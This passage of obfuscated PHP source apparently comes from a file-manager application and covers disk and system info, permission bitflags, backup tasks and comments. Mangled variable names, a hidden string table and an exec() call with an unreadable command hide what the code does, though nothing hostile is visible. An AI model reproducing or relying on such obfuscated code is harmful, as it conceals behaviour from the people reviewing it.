$ûû‹»ÏÖ[$ú‡úçâ[1092]]; if ($™‘˜ßÌà == $ú‡úçâ[1080]) { $áµüèÀû = explode($ú‡úçâ[1422], $ûû‹»ÏÖ[$ú‡úçâ[1091]]); $™‘˜ßÌà = $áµüèÀû[0]; } if ($™‘˜ßÌà == $ú‡úçâ[1028] || $™‘˜ßÌà == $ú‡úçâ[901]) { $í±È½†± = Model()->db()->query($ú‡úçâ[2120]); $ÒõòÈ© = $í±È½†±[0] && isset($í±È½†±[0][$ú‡úçâ[1814]]) ? $í±È½†±[0][$ú‡úçâ[1814]] : 0; $™‘˜ßÌà = $ú‡úçâ[2121] . ($ÒõòÈ© ? $ú‡úçâ[8] . $ÒõòÈ© : $ú‡úçâ[12]); } $ŞÏé†‡ = $GLOBALS[$ú‡úçâ[6]][$ú‡úçâ[426]][$ú‡úçâ[932]]; return array($ú‡úçâ[2122] => $Ş—ŠØ¶¹ ? $Ş—ŠØ¶¹[$ú‡úçâ[2123]] : 0, $ú‡úçâ[2124] => $Ş—ŠØ¶¹ ? $Ş—ŠØ¶¹[$ú‡úçâ[2125]] : 0, $ú‡úçâ[2126] => (int) $öÆÃØŠÑ[$ú‡úçâ[2123]] * 1024 * 1024 * 1024, $ú‡úçâ[2127] => (int) $ÒÕïØòÙ, $ú‡úçâ[2128] => ucfirst($ºÕã¹Å), $ú‡úçâ[2129] => $ú‡úçâ[2130] . PHP_VERSION, $ú‡úçâ[2131] => phpBuild64() ? 64 : 32, $ú‡úçâ[855] => str_replace($ú‡úçâ[1254], $ú‡úçâ[1108], $™‘˜ßÌà), $ú‡úçâ[426] => ucfirst($ŞÏé†‡), $ú‡úçâ[32] => $_SERVER[$ú‡úçâ[2132]]); } private function diskDriver() { $ó¤Ê¶Ç¼ =& $_SERVER[±Ö‰ô½¯]; $æ…¹›Ä£ = $ó¤Ê¶Ç¼[8]; $„ÕÒÙŸ® = $GLOBALS[$ó¤Ê¶Ç¼[6]][$ó¤Ê¶Ç¼[1446]] == $ó¤Ê¶Ç¼[1447]; if ($„ÕÒÙŸ®) { $æ…¹›Ä£ = $ó¤Ê¶Ç¼[2133]; if (function_exists($ó¤Ê¶Ç¼[2134])) { exec($ó¤Ê¶Ç¼[2135], $ïò‹»º¹); $æ…¹›Ä£ = $ïò‹»º¹[1] . $ó¤Ê¶Ç¼[8]; } } if (!file_exists($æ…¹›Ä£)) { return; } if (!function_exists($ó¤Ê¶Ç¼[2136])) { return; } $§‹÷®® = @disk_total_space($æ…¹›Ä£); $£äèëò = $§‹÷®® - @disk_free_space($æ…¹›Ä£); return array($ó¤Ê¶Ç¼[2123] => $§‹÷®®, $ó¤Ê¶Ç¼[2125] => $£äèëò); } public function fileChart($è×£ˆˆ) { $Á°â‰Å» =& $_SERVER[±Ö‰ô½¯]; if (isset($è×£ˆˆ[$Á°â‰Å»[1542]])) { return Model($Á°â‰Å»[930])->userFileTypeProfile($è×£ˆˆ[$Á°â‰Å»[1542]]); } if (isset($è×£ˆˆ[$Á°â‰Å»[1444]])) { return Model($Á°â‰Å»[930])->groupFileTypeProfile($è×£ˆˆ[$Á°â‰Å»[1444]]); } $ã¢Ò€á‹ = $this->sourceSize(); $¼şŸ§´¯ = array($Á°â‰Å»[192] => 0, $Á°â‰Å»[190] => 1); $‡ÛµƒÍ = Model($Á°â‰Å»[930])->where($¼şŸ§´¯)->sum($Á°â‰Å»[79]); $¼şŸ§´¯[$Á°â‰Å»[190]] = 2; $Ï«…Ù¬í = Model($Á°â‰Å»[930])->where($¼şŸ§´¯)->sum($Á°â‰Å»[79]); return array($Á°â‰Å»[861] => $ã¢Ò€á‹[$Á°â‰Å»[79]], $Á°â‰Å»[2073] => $ã¢Ò€á‹[$Á°â‰Å»[2073]], $Á°â‰Å»[2074] => (int) $‡ÛµƒÍ, $Á°â‰Å»[2075] => (int) $Ï«…Ù¬í); } private function sourceSize() { $İ‹ šÑÚ =& $_SERVER[±Ö‰ô½¯]; $õÒŠØò¥ = Model($İ‹ šÑÚ[930])->where(array($İ‹ šÑÚ[497] => 0))->sum($İ‹ šÑÚ[79]); $®·îéÉ = Model($İ‹ šÑÚ[557])->sum($İ‹ šÑÚ[79]); if ($®·îéÉ > $õÒŠØò¥) { $®·îéÉ = $õÒŠØò¥; } return array($İ‹ šÑÚ[79] => (int) $õÒŠØò¥, $İ‹ šÑÚ[2073] => (int) $®·îéÉ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ıÚ˜Ö =& $_SERVER[±Ö‰ô½¯]; $‡Ú×óàø = array(array($ıÚ˜Ö[506] => LNG($ıÚ˜Ö[2137]), $ıÚ˜Ö[2138] => $ıÚ˜Ö[2139], $ıÚ˜Ö[2140] => 1, $ıÚ˜Ö[2141] => 1, $ıÚ˜Ö[2142] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ıÚ˜Ö[506] => LNG($ıÚ˜Ö[2143]), $ıÚ˜Ö[2138] => $ıÚ˜Ö[2144], $ıÚ˜Ö[2140] => 2, $ıÚ˜Ö[2141] => 1, $ıÚ˜Ö[2142] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ıÚ˜Ö[506] => LNG($ıÚ˜Ö[2145]), $ıÚ˜Ö[2138] => $ıÚ˜Ö[2146], $ıÚ˜Ö[2140] => 3, $ıÚ˜Ö[2141] => 1, $ıÚ˜Ö[2142] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ıÚ˜Ö[506] => LNG($ıÚ˜Ö[2147]), $ıÚ˜Ö[2138] => $ıÚ˜Ö[2148], $ıÚ˜Ö[2140] => 4, $ıÚ˜Ö[2141] => 1, $ıÚ˜Ö[2142] => self::AUTH_SHOW | self::AUTH_VIEW), array($ıÚ˜Ö[506] => LNG($ıÚ˜Ö[2149]), $ıÚ˜Ö[2138] => $ıÚ˜Ö[2150], $ıÚ˜Ö[2140] => 5, $ıÚ˜Ö[2141] => 1, $ıÚ˜Ö[2142] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ıÚ˜Ö[506] => LNG($ıÚ˜Ö[2151]), $ıÚ˜Ö[2138] => $ıÚ˜Ö[2152], $ıÚ˜Ö[2140] => 6, $ıÚ˜Ö[2141] => 1, $ıÚ˜Ö[2142] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ıÚ˜Ö[506] => LNG($ıÚ˜Ö[2153]), $ıÚ˜Ö[2138] => $ıÚ˜Ö[2154], $ıÚ˜Ö[2140] => 7, $ıÚ˜Ö[2141] => 1, $ıÚ˜Ö[2142] => 0)); return $‡Ú×óàø; } public static function authCheck($Ô¡ŞâÒë, $ÈÉ³¢Ù, $—Ì–×’‹ = true) { $î×ô¾ÊÍ =& $_SERVER[±Ö‰ô½¯]; $Ô¡ŞâÒë = intval($Ô¡ŞâÒë); if ($—Ì–×’‹) { if (KodUser::isRoot() && $GLOBALS[$î×ô¾ÊÍ[6]][$î×ô¾ÊÍ[2155]]) { return !0; } } if ($Ô¡ŞâÒë <= 0) { return !1; } if (($Ô¡ŞâÒë & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ô¡ŞâÒë & $ÈÉ³¢Ù); } public static function authCheckShow($îœÔ—Ë‘) { return self::authCheck($îœÔ—Ë‘, self::AUTH_SHOW); } public static function authCheckView($ñ‚¢ú²ó) { return self::authCheck($ñ‚¢ú²ó, self::AUTH_VIEW); } public static function authCheckDownload($•õúŠš¾) { return self::authCheck($•õúŠš¾, self::AUTH_DOWNLOAD); } public static function authCheckUpload($¸º›Âü) { return self::authCheck($¸º›Âü, self::AUTH_UPLOAD); } public static function authCheckEdit($×ÒòÅ˜Ç) { return self::authCheck($×ÒòÅ˜Ç, self::AUTH_EDIT); } public static function authCheckRemove($•ğğÍ®Ö) { return self::authCheck($•ğğÍ®Ö, self::AUTH_REMOVE); } public static function authCheckShare($ÀŞ†„Ğ¥) { return self::authCheck($ÀŞ†„Ğ¥, self::AUTH_SHARE); } public static function authCheckComment($Öş¸³Çê) { return self::authCheck($Öş¸³Çê, self::AUTH_COMMENT); } public static function authCheckEvent($ÄüÃ¾¤ö) { return self::authCheck($ÄüÃ¾¤ö, self::AUTH_EVENT); } public static function authCheckRoot($ÍĞ¦šú) { return self::authCheck($ÍĞ¦šú, self::AUTH_ROOT); } public static function authCheckAction($Ù½ì”™¸, $Ñóï¦Šî) { $Õü°ïì‚ =& $_SERVER[±Ö‰ô½¯]; $ùĞéÛœÑ = array($Õü°ïì‚[1509] => self::AUTH_SHOW, $Õü°ïì‚[1510] => self::AUTH_VIEW, $Õü°ïì‚[1331] => self::AUTH_DOWNLOAD, $Õü°ïì‚[108] => self::AUTH_UPLOAD, $Õü°ïì‚[1511] => self::AUTH_EDIT, $Õü°ïì‚[1280] => self::AUTH_REMOVE, $Õü°ïì‚[1512] => self::AUTH_SHARE, $Õü°ïì‚[431] => self::AUTH_COMMENT, $Õü°ïì‚[1513] => self::AUTH_EVENT, $Õü°ïì‚[1514] => self::AUTH_ROOT); if (!isset($ùĞéÛœÑ[$Ñóï¦Šî])) { return; } $Å÷’ƒüØ = $ùĞéÛœÑ[$Ñóï¦Šî]; $Ù½ì”™¸ = intval($Ù½ì”™¸); if ($Ù½ì”™¸ <= 0) { return !1; } if (($Ù½ì”™¸ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ù½ì”™¸ & $Å÷’ƒüØ); } public static function authDisable($ĞË†ëŠ, $÷Æ’ö‘ò) { if (intval($ĞË†ëŠ) <= 0) { return 0; } return intval($ĞË†ëŠ) & ~$÷Æ’ö‘ò; } public $optionType = "\123\x79\163\x74\x65\x6d\56\163\x6f\165\x72\x63\x65\x41\165\164\150\114\x69\163\164"; public $field = array("\156\141\x6d\x65", "\141\165\164\150", "\x6c\x61\142\145\x6c", "\x64\151\x73\160\154\141\x79", "\x73\171\163\164\145\x6d", "\x73\x6f\162\x74"); public function initData() { $æÔß¦ñÏ = $this->authDefault(); foreach ($æÔß¦ñÏ as $²ü“ƒÍ») { $this->add($²ü“ƒÍ»); } } public function findAuth($ãÈºÀÂŸ, $¦öØÖã°) { $‚Ñ§Ó…‰ =& $_SERVER[±Ö‰ô½¯]; $İÙƒâ²º = parent::listData(); foreach ($İÙƒâ²º as $Åß®­±İ) { $óºÚ“Õ½ = intval($Åß®­±İ[$‚Ñ§Ó…‰[499]]); if ($óºÚ“Õ½ <= 0 || $Åß®­±İ[$‚Ñ§Ó…‰[2156]] == 0) { continue; } if (($óºÚ“Õ½ & $ãÈºÀÂŸ) != $ãÈºÀÂŸ) { continue; } if (($óºÚ“Õ½ & $¦öØÖã°) != 0) { continue; } return $Åß®­±İ[$‚Ñ§Ó…‰[484]]; } return !1; } public function findAuthMax($ŒÉÉ¾Ï³, $õ”’”€Ÿ) { $³üªÓ„â =& $_SERVER[±Ö‰ô½¯]; $èîúÏş¾ = !1; $ªÅÌÎçø = parent::listData(); foreach ($ªÅÌÎçø as $…À¦³ô) { $’õÓÓÀ¡ = intval($…À¦³ô[$³üªÓ„â[499]]); if ($’õÓÓÀ¡ <= 0 || $…À¦³ô[$³üªÓ„â[2156]] == 0) { continue; } if (($’õÓÓÀ¡ & $ŒÉÉ¾Ï³) != $ŒÉÉ¾Ï³) { continue; } if (($’õÓÓÀ¡ & $õ”’”€Ÿ) != 0) { continue; } if (!$èîúÏş¾) { $èîúÏş¾ = $…À¦³ô; continue; } if (intval($èîúÏş¾[$³üªÓ„â[499]]) < $’õÓÓÀ¡) { $èîúÏş¾ = $…À¦³ô; } } return $èîúÏş¾ ? $èîúÏş¾[$³üªÓ„â[484]] : !1; } public function findAuthReadOnly() { $¿¬€Çå¯ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $—³”¸õñ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($¿¬€Çå¯, $—³”¸õñ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $¥©ƒ’¹µ =& $_SERVER[±Ö‰ô½¯]; $Á™Úã‰” = parent::listData(); $‡Ì‘Âíğ = !1; foreach ($Á™Úã‰” as $–‡£•„Ü) { if ($–‡£•„Ü[$¥©ƒ’¹µ[499]] <= 0 || $–‡£•„Ü[$¥©ƒ’¹µ[2156]] == $¥©ƒ’¹µ[230]) { continue; } if (!$‡Ì‘Âíğ) { $‡Ì‘Âíğ = $–‡£•„Ü; continue; } if ($‡Ì‘Âíğ[$¥©ƒ’¹µ[499]] > $–‡£•„Ü[$¥©ƒ’¹µ[499]]) { $‡Ì‘Âíğ = $–‡£•„Ü; } } return $‡Ì‘Âíğ ? $‡Ì‘Âíğ[$¥©ƒ’¹µ[484]] : $¥©ƒ’¹µ[12]; } public function listData($ëãì›¦¸ = false, $¥Û¿ÕÀæ = "\x73\157\162\164", $òæËŞë† = false) { return parent::listData($ëãì›¦¸, $¥Û¿ÕÀæ, $òæËŞë†); } public function update($ ÃÔºøŒ, $ÁÂÅ¡Ô­) { $„³è»ÅÙ =& $_SERVER[±Ö‰ô½¯]; $ÔºÍ§™ß = parent::listData($ ÃÔºøŒ); $·´ÄÑƒ’ = $this->findByName($ÁÂÅ¡Ô­[$„³è»ÅÙ[32]]); if (!$ÔºÍ§™ß || $·´ÄÑƒ’ && $·´ÄÑƒ’[$„³è»ÅÙ[484]] != $ÔºÍ§™ß[$„³è»ÅÙ[484]]) { return !1; } $this->filterAuth($ÁÂÅ¡Ô­[$„³è»ÅÙ[499]]); return parent::update($ ÃÔºøŒ, $ÁÂÅ¡Ô­); } public function remove($—àÒ¿¯Ÿ) { $ƒ¸ìëšæ = parent::listData($—àÒ¿¯Ÿ); if (!$ƒ¸ìëšæ || $ƒ¸ìëšæ[$_SERVER[±Ö‰ô½¯][191]]) { return !1; } return parent::remove($—àÒ¿¯Ÿ); } public function add($¥‡­êçı = array()) { $ŞüÔñ Ñ =& $_SERVER[±Ö‰ô½¯]; if ($this->findByName($¥‡­êçı[$ŞüÔñ Ñ[32]])) { return !1; } $£×à÷ô‡ = array($ŞüÔñ Ñ[32] => $ŞüÔñ Ñ[12], $ŞüÔñ Ñ[499] => 1, $ŞüÔñ Ñ[2157] => $ŞüÔñ Ñ[2146], $ŞüÔñ Ñ[2156] => 1, $ŞüÔñ Ñ[191] => 0, $ŞüÔñ Ñ[2158] => 0); $¥‡­êçı = array_merge($£×à÷ô‡, $¥‡­êçı); $¥‡­êçı[$ŞüÔñ Ñ[2158]] = $this->getSort(); $this->filterAuth($¥‡­êçı[$ŞüÔñ Ñ[499]]); return parent::insert($¥‡­êçı); } private function getSort() { $¥¥Ø˜í =& $_SERVER[±Ö‰ô½¯]; $˜·ó†—ú = parent::listData(); $¥¶‘Õß = array_to_keyvalue($˜·ó†—ú, $¥¥Ø˜í[12], $¥¥Ø˜í[2158]); return empty($¥¶‘Õß) ? 0 : max($¥¶‘Õß) + 1; } private function filterAuth(&$«³æï“) { if (!$«³æï“) { return; } $Ó„º‰ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $øòØÅÛ = array(); foreach ($Ó„º‰ as $„Á”ïä«) { if ($«³æï“ & $„Á”ïä«) { $øòØÅÛ[] = $„Á”ïä«; } } if (in_array(self::AUTH_ROOT, $øòØÅÛ)) { $«³æï“ = array_sum($Ó„º‰); return; } $ˆï¹ºË§ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($øòØÅÛ as $„Á”ïä«) { if (isset($ˆï¹ºË§[$„Á”ïä«])) { $øòØÅÛ = array_merge($øòØÅÛ, $ˆï¹ºË§[$„Á”ïä«]); } } $øòØÅÛ[] = self::AUTH_SHOW; $«³æï“ = array_sum(array_unique($øòØÅÛ)); } public function sort($°Í¹¬ÑÓ, $×ğ³à¨) { return parent::update($°Í¹¬ÑÓ, $×ğ³à¨); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\x2e\142\141\143\x6b\x75\x70\x4c\151\x73\164"; public $field = array("\x69\157", "\x6e\141\x6d\x65", "\163\x74\141\x74\x75\x73", "\x63\157\x6e\x74\145\156\x74", "\155\x61\x6e\165\x61\154", "\162\x65\163\165\154\x74", "\x74\151\155\145\x46\162\157\155", "\x74\151\155\x65\124\x6f"); public function config() { $õ©Ä¥›À =& $_SERVER[±Ö‰ô½¯]; Action($õ©Ä¥›À[2159])->taskInit(); $‚«óÕüî = Model($õ©Ä¥›À[870])->get($õ©Ä¥›À[877]); $‚«óÕüî = json_decode($‚«óÕüî, !0); $‚«óÕüî = is_array($‚«óÕüî) ? $‚«óÕüî : array(); $this->parseContent($‚«óÕüî); unset($‚«óÕüî[$õ©Ä¥›À[1900]]); Model($õ©Ä¥›À[1899])->cacheClear(); $Â›³Ïİ€ = $õ©Ä¥›À[2160]; $¥ÁÆÃÎ§ = Model($õ©Ä¥›À[2161])->findByKey($õ©Ä¥›À[1513], $Â›³Ïİ€); if (!$¥ÁÆÃÎ§) { $¥ÁÆÃÎ§ = array(); } if (isset($¥ÁÆÃÎ§[$õ©Ä¥›À[206]])) { $¥ÁÆÃÎ§[$õ©Ä¥›À[206]] = json_decode($¥ÁÆÃÎ§[$õ©Ä¥›À[206]], !0); } if (isset($‚«óÕüî[$õ©Ä¥›À[206]])) { $¥ÁÆÃÎ§[$õ©Ä¥›À[206]][$õ©Ä¥›À[1903]] = $‚«óÕüî[$õ©Ä¥›À[206]]; unset($‚«óÕüî[$õ©Ä¥›À[206]]); } return array_merge($¥ÁÆÃÎ§, $‚«óÕüî); } public function listData($ÁÁëØ‡‚ = false, $‡¾ÂÂ“ğ = "\155\x6f\x64\x69\x66\171\124\151\155\145", $¾ÙîÉ«æ = false) { $ôóâ­ÁŠ = parent::listData($ÁÁëØ‡‚, $‡¾ÂÂ“ğ, !0); if (!$ôóâ­ÁŠ) { return $ôóâ­ÁŠ; } if ($ÁÁëØ‡‚) { $ôóâ­ÁŠ = array($ôóâ­ÁŠ); } foreach ($ôóâ­ÁŠ as &$ëùÂà­) { $this->parseContent($ëùÂà­); } return $ÁÁëØ‡‚ ? $ôóâ­ÁŠ[0] : $ôóâ­ÁŠ; } public function parseContent(&$Û¦Î¡à¿) { $©•áÇÚÛ =& $_SERVER[±Ö‰ô½¯]; $µûÉºéí = _get($Û¦Î¡à¿, $©•áÇÚÛ[170], $©•áÇÚÛ[91]); if (!in_array($µûÉºéí, array($©•áÇÚÛ[876], $©•áÇÚÛ[1254]))) { $Û¦Î¡à¿[$©•áÇÚÛ[170]] = $µûÉºéí == $©•áÇÚÛ[91] ? $©•áÇÚÛ[1254] : $©•áÇÚÛ[876]; } } public function lastItem() { $Ò®®öè› = $this->listData(); return !empty($Ò®®öè›[0]) ? $Ò®®öè›[0] : null; } public function kill($Š©ì¦‚–) { $à¾éëŒÒ =& $_SERVER[±Ö‰ô½¯]; $âò…Ø¬¯ = $this->listData($Š©ì¦‚–); if (!$âò…Ø¬¯ || empty($âò…Ø¬¯[$à¾éëŒÒ[32]])) { return !0; } Task::kill($à¾éëŒÒ[885]); Task::kill($à¾éëŒÒ[906]); Task::kill($à¾éëŒÒ[914]); $ı´û•»š = $âò…Ø¬¯[$à¾éëŒÒ[32]]; $‚¶Ÿæåš = TEMP_FILES . $à¾éëŒÒ[880] . $ı´û•»š . $à¾éëŒÒ[8]; IO::remove($‚¶Ÿæåš, !1); return $this->remove($Š©ì¦‚–); } public function remove($Æ¶èÙ½š) { $¢„ü£‘ = $this->listData($Æ¶èÙ½š); if (!$¢„ü£‘) { return !0; } return $this->backupRemove($¢„ü£‘); } private function backupRemove($©”¶¹¤Ô) { parent::remove($©”¶¹¤Ô[$_SERVER[±Ö‰ô½¯][484]]); $ú›¢•µ = $this->backupPath($©”¶¹¤Ô); IO::remove($ú›¢•µ, !1); return !0; } private function backupPath($¸ıâŒÀ­) { $Ó‹Ü…Ê° =& $_SERVER[±Ö‰ô½¯]; $´îØ‘Š = $¸ıâŒÀ­[$Ó‹Ü…Ê°[32]]; $‚ç•²£ñ = Model($Ó‹Ü…Ê°[870])->get($Ó‹Ü…Ê°[871]); $ ‘ŠÈ©‹ = substr(md5($Ó‹Ü…Ê°[872] . $‚ç•²£ñ . $´îØ‘Š), 0, 8); return "\x7b\x69\157\72{$¸ıâŒÀ­[$Ó‹Ü…Ê°[849]]}\x7d\57\x64\141\164\141\x62\141\163\145\x2f\142\x61\x63\153\x75\x70\x2f" . $´îØ‘Š . $Ó‹Ü…Ê°[11] . $ ‘ŠÈ©‹; } public function start() { $Õ§»øâ‡ =& $_SERVER[±Ö‰ô½¯]; if ($GLOBALS[$Õ§»øâ‡[6]][$Õ§»øâ‡[92]][$Õ§»øâ‡[2162]] != $Õ§»øâ‡[91]) { return !0; } $Õõˆ™®¢ = $this->config(); if (!$Õõˆ™®¢ || $Õõˆ™®¢[$Õ§»øâ‡[1900]] != $Õ§»øâ‡[91]) { return !1; } if ($Õõˆ™®¢[$Õ§»øâ‡[170]] == $Õ§»øâ‡[876]) { $›Ñ‚Ô‚ç = Model($Õ§»øâ‡[870])->get($Õ§»øâ‡[1376]); if ($›Ñ‚Ô‚ç == $Õ§»øâ‡[1377]) { $Õõˆ™®¢[$Õ§»øâ‡[170]] = $Õ§»øâ‡[1254]; } } $…şïó˜ = $this->process(); foreach ($…şïó˜ as $†öÀ¯Ì¿) { if ($†öÀ¯Ì¿) { return Task::restart($†öÀ¯Ì¿[$Õ§»øâ‡[484]]); } } $¾×¥¶Ğ• = new Backup(); $óğÓÕõ« = $¾×¥¶Ğ•->db(); if ($óğÓÕõ«) { $óğÓÕõ« = $¾×¥¶Ğ•->dbFile(); if ($óğÓÕõ« && $Õõˆ™®¢[$Õ§»øâ‡[170]] == $Õ§»øâ‡[876]) { $óğÓÕõ« = $¾×¥¶Ğ•->file(); } } Backup::set(array($Õ§»øâ‡[847] => 1, $Õ§»øâ‡[859] => time())); return !0; } public function process() { $ŞŞîİóª =& $_SERVER[±Ö‰ô½¯]; $ğ±‰˜Ö¨ = array($ŞŞîİóª[855] => Task::get($ŞŞîİóª[885]), $ŞŞîİóª[860] => Task::get($ŞŞîİóª[906]), $ŞŞîİóª[232] => Task::get($ŞŞîİóª[914])); $Â…å‹ˆï = !1; foreach ($ğ±‰˜Ö¨ as &$Šà­­¦ ) { if ($Â…å‹ˆï) { $Šà­­¦  = !1; continue; } if ($Šà­­¦ ) { $»ûÑ„ÜÎ = intval(_get($Šà­­¦ , $ŞŞîİóª[1934], 0)); if (time() - $»ûÑ„ÜÎ > 7200) { Task::kill($Šà­­¦ [$ŞŞîİóª[484]]); $Â…å‹ˆï = !0; $Šà­­¦  = !1; } } } return $ğ±‰˜Ö¨; } public function restore() { $² ÊÈ‡º =& $_SERVER[±Ö‰ô½¯]; ActionCall($² ÊÈ‡º[2163], !0, 1); ActionCall($² ÊÈ‡º[2163], !0, 0); } } goto b¦ÚøÓ¶¥†; b¦ÚøÓ¶¥†: class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\155\x65\156\x74"; protected $tableMeta = array("\x74\141\142\x6c\x65\x4e\141\155\145" => "\143\x6f\x6d\155\145\x6e\164\137\x6d\145\164\141", "\x6d\145\164\x61\x46\151\x65\154\x64" => "\x63\x6f\155\x6d\x65\x6e\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Ñº‘éªˆ) { $Ğ¯‰€ =& $_SERVER[±Ö‰ô½¯]; if ($Ñº‘éªˆ[$Ğ¯‰€[2164]]) { $æ³Ùì¼‡ = $this->where(array($Ğ¯‰€[2165] => $Ñº‘éªˆ[$Ğ¯‰€[2164]]))->find(); if (!$æ³Ùì¼‡ || $æ³Ùì¼‡[$Ğ¯‰€[190]] != $Ñº‘éªˆ[$Ğ¯‰€[190]] || $æ³Ùì¼‡[$Ğ¯‰€[586]] != $Ñº‘éªˆ[$Ğ¯‰€[586]]) { return !1; } $this->where(array($Ğ¯‰€[2165] => $Ñº‘éªˆ[$Ğ¯‰€[2164]]))->setAdd($Ğ¯‰€[2166], 1); } $Ñº‘éªˆ[$Ğ¯‰€[2167]] = 0; $Ñº‘éªˆ[$Ğ¯‰€[2166]] = 0; $Ñº‘éªˆ[$Ğ¯‰€[847]] = 1; return $this->add($Ñº‘éªˆ); } public function commentCount($ãô©ÇÆü, $Ñ¨¥ú˜, $¸—¹±“­ = false) { $ÖêËç½ß =& $_SERVER[±Ö‰ô½¯]; if (!$ãô©ÇÆü) { return array(); } if (is_string($ãô©ÇÆü) || is_int($ãô©ÇÆü)) { $ãô©ÇÆü = array($ãô©ÇÆü); } $Û§œ€¶“ = array($ÖêËç½ß[586], $ÖêËç½ß[2168] => $ÖêËç½ß[582]); $âÙ¿¼ş = array($ÖêËç½ß[586] => array($ÖêËç½ß[7], $ãô©ÇÆü), $ÖêËç½ß[190] => $Ñ¨¥ú˜); if ($¸—¹±“­) { $âÙ¿¼ş[$ÖêËç½ß[1542]] = $¸—¹±“­; } $ã€Öš¸è = $this->field($Û§œ€¶“)->where($âÙ¿¼ş)->group($ÖêËç½ß[586])->select(); return array_to_keyvalue($ã€Öš¸è, $ÖêËç½ß[586], $ÖêËç½ß[582]); } public function starTarget($õõ‡Ş‚ì, $È¢º¢ğ) { $ˆ¨¯©í =& $_SERVER[±Ö‰ô½¯]; $®¶ê¦¹ = $õõ‡Ş‚ì + self::TYPE_STAR_OFFSET; $º€Ğâ‹Õ = array($ˆ¨¯©í[1542] => USER_ID, $ˆ¨¯©í[190] => $®¶ê¦¹, $ˆ¨¯©í[586] => $È¢º¢ğ); $ĞèğÒù = $this->where($º€Ğâ‹Õ)->find(); if ($ĞèğÒù) { return $this->where(array($ˆ¨¯©í[484] => $ĞèğÒù[$ˆ¨¯©í[484]]))->delete(); } $¥ßÑœ€€ = array($ˆ¨¯©í[2164] => 0, $ˆ¨¯©í[1542] => USER_ID, $ˆ¨¯©í[847] => 1, $ˆ¨¯©í[170] => $ˆ¨¯©í[12], $ˆ¨¯©í[190] => $®¶ê¦¹, $ˆ¨¯©í[586] => $È¢º¢ğ, $ˆ¨¯©í[2167] => 0, $ˆ¨¯©í[2166] => 0); return $this->add($¥ßÑœ€€); } public function starTargetCount($İ•ÑØ÷÷, $³ÜŠÎ’¡) { $ı¶À±¤ó =& $_SERVER[±Ö‰ô½¯]; $¹²‘ÚœÔ = $³ÜŠÎ’¡ + self::TYPE_STAR_OFFSET; $±ÁØŸÏÂ = $this->commentCount($İ•ÑØ÷÷, $¹²‘ÚœÔ); $¥ÖÌƒÚê = $this->commentCount($İ•ÑØ÷÷, $¹²‘ÚœÔ, USER_ID); return array($ı¶À±¤ó[2169] => $±ÁØŸÏÂ, $ı¶À±¤ó[2170] => $¥ÖÌƒÚê); } public function starTargetUserList($¶Ê¬ãÉÒ, $¯îÓ“…™) { $Ç„òüù =& $_SERVER[±Ö‰ô½¯]; $Ğ„ÕÀ¾¨ = $¶Ê¬ãÉÒ + self::TYPE_STAR_OFFSET; $óñ‹üŒÇ = array($Ç„òüù[586] => $¯îÓ“…™, $Ç„òüù[190] => $Ğ„ÕÀ¾¨); $Ùæº¥’‘ = $this->where($óñ‹üŒÇ)->count(); $Ãù ¢ò = array($Ç„òüù[334] => $Ùæº¥’‘, $Ç„òüù[2171] => array()); if (!$Ùæº¥’‘) { return $Ãù ¢ò; } $åÙŸÂ•Å = $this->field($Ç„òüù[1542])->where($óñ‹üŒÇ)->limit(500)->select(); $åÙŸÂ•Å = array_to_keyvalue($åÙŸÂ•Å, $Ç„òüù[12], $Ç„òüù[1542]); $Ãù ¢ò[$Ç„òüù[2171]] = Model($Ç„òüù[594])->userListInfo($åÙŸÂ•Å); return $Ãù ¢ò; } public function prasiseUserList($…‚Ş’£‘) { $×Šé›ùÈ =& $_SERVER[±Ö‰ô½¯]; $ÍÑÆËÃ‡ = 